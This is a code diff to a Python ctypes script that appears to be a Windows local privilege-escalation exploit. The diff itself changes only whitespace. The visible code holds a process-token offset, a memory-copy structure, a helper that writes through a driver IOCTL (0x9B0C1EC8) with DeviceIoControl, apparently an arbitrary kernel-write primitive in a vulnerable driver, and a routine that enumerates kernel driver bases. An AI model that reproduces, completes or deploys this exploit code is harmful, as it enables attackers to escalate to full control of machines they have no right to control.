@@ -97,14 +97,11 @@ token_off = 0x4B8
 key = 0
 
 
-def GetProcAddressAbsolute(hmodule, realbase, symbol):
-    
+def GetProcAddressAbsolute(hmodule, realbase, symbol):    
     return GetProcAddress(hmodule, symbol) - hmodule + realbase
 
 
 class DbMemcpy(LittleEndianStructure):
-    
-
     _fields_ = [("key", c_uint64), ("ptr", LPVOID), ("offset", DWORD), ("pad", DWORD)]
 
 
@@ -126,8 +123,7 @@ def _write(hdev, ptr, contents):
     DeviceIoControl(hdev, 0x9B0C1EC8, buf, len(buf), buf, len(buf), None, None)
 
 
-def get_driver_bases():
-    
+def get_driver_bases():    
     lpcbNeeded = DWORD()
     EnumDeviceDrivers(None, 0, byref(lpcbNeeded))
     bases = (LPVOID * int(lpcbNeeded.value / sizeof(LPVOID)))()
